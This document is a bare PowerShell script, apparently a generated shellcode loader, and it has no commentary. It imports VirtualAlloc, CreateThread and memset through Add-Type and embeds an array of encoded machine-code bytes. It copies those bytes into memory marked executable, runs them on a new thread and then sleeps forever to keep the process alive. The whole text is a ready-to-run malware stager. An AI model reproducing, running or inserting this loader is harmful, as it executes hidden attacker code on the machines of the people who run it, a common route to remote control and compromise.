$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0xe9,0xed,0xfb,0xad,0xdb,0xd2,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x31,0x78,0x13,0x83,0xc0,0x04,0x03,0x78,0xe6,0x0f,0x0e,0x51,0x10,0x4d,0xf1,0xaa,0xe0,0x32,0x7b,0x4f,0xd1,0x72,0x1f,0x1b,0x41,0x43,0x6b,0x49,0x6d,0x28,0x39,0x7a,0xe6,0x5c,0x96,0x8d,0x4f,0xea,0xc0,0xa0,0x50,0x47,0x30,0xa2,0xd2,0x9a,0x65,0x04,0xeb,0x54,0x78,0x45,0x2c,0x88,0x71,0x17,0xe5,0xc6,0x24,0x88,0x82,0x93,0xf4,0x23,0xd8,0x32,0x7d,0xd7,0xa8,0x35,0xac,0x46,0xa3,0x6f,0x6e,0x68,0x60,0x04,0x27,0x72,0x65,0x21,0xf1,0x09,0x5d,0xdd,0x00,0xd8,0xac,0x1e,0xae,0x25,0x01,0xed,0xae,0x62,0xa5,0x0e,0xc5,0x9a,0xd6,0xb3,0xde,0x58,0xa5,0x6f,0x6a,0x7b,0x0d,0xfb,0xcc,0xa7,0xac,0x28,0x8a,0x2c,0xa2,0x85,0xd8,0x6b,0xa6,0x18,0x0c,0x00,0xd2,0x91,0xb3,0xc7,0x53,0xe1,0x97,0xc3,0x38,0xb1,0xb6,0x52,0xe4,0x14,0xc6,0x85,0x47,0xc8,0x62,0xcd,0x65,0x1d,0x1f,0x8c,0xe1,0xd2,0x12,0x2f,0xf1,0x7c,0x24,0x5c,0xc3,0x23,0x9e,0xca,0x6f,0xab,0x38,0x0c,0x90,0x86,0xfd,0x82,0x6f,0x29,0xfe,0x8b,0xab,0x7d,0xae,0xa3,0x1a,0xfe,0x25,0x34,0xa3,0x2b,0xe9,0x64,0x0b,0x84,0x4a,0xd5,0xeb,0x74,0x23,0x3f,0xe4,0xab,0x53,0x40,0x2f,0xc4,0xfe,0xba,0xa7,0xc2,0xdb,0x1d,0xbd,0x7d,0x26,0x9e,0xd0,0x21,0xaf,0x78,0xb8,0xc9,0xf9,0xd3,0x54,0x73,0xa0,0xa8,0xc5,0x7c,0x7e,0xd5,0xc5,0xf7,0x8d,0x29,0x8b,0xff,0xf8,0x39,0x7b,0xf0,0xb6,0x60,0x2d,0x0f,0x6d,0x0e,0xd1,0x85,0x8a,0x99,0x86,0x31,0x91,0xfc,0xe0,0x9d,0x6a,0x2b,0x7b,0x17,0xff,0x94,0x13,0x58,0xef,0x14,0xe3,0x0e,0x65,0x15,0x8b,0xf6,0xdd,0x46,0xae,0xf8,0xcb,0xfa,0x63,0x6d,0xf4,0xaa,0xd0,0x26,0x9c,0x50,0x0f,0x00,0x03,0xaa,0x7a,0x90,0x7f,0x7d,0x42,0xe6,0x91,0xbd;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};